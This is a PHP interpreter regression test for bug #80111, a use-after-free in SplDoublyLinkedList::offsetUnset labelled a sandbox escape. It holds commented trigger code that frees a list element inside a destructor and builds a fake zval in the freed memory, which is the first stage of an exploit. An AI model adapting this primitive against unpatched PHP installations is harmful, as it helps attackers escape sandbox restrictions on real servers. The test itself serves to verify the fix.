--TEST--
Bug #80111: PHP SplDoublyLinkedList::offsetUnset UAF Sandbox Escape
--FILE--
<?php

function i2s(&$s, $p, $i, $x=8)
{
    for($j=0;$j<$x;$j++)
    {
        $s[$p+$j] = chr($i & 0xff);
        $i >>= 8;
    }
}

class Trigger
{
    function __destruct()
    {
        global $s, $b;
        # Add a reference afterwards
        //$v = new SplDoublyLinkedList();
        //$v->setIteratorMode(SplDoublyLinkedList::IT_MODE_DELETE);
        # Remove element #2 from the list: this has no effect on 
        # intern->traverse_pointer, since it is removed from the list already
        # The element, along with the zval, is freed
        unset($s[0]);
        
        $a = str_shuffle(str_repeat('A', 40-24-1));
        # Build a fake zval (long, value: 12345678)
        i2s($a, 0x00, 12345678); # ptr
        i2s($a, 0x08, 4, 7); # type: long
        
        var_dump($s->current());
        $s->next();
        # The value is our fake zval
        var_dump($s->current());
        print_r('DONE'."\n");
    }
}

# Create a 3-item dllist
$s = new SplDoublyLinkedList();

# This is the UAF trigger
$s->push(new Trigger());

#$b = &$a;
$s->push(3);

# Points intern->traverse_pointer to our object element
$s->rewind();
#$s->next();

# calls SplDoublyLinkedList::offsetUnset, which will remove the element from the
# dllist, and then destruct the object, before clearing traverse_pointer
unset($s[0]);

?>
--EXPECT--
NULL
NULL
DONE
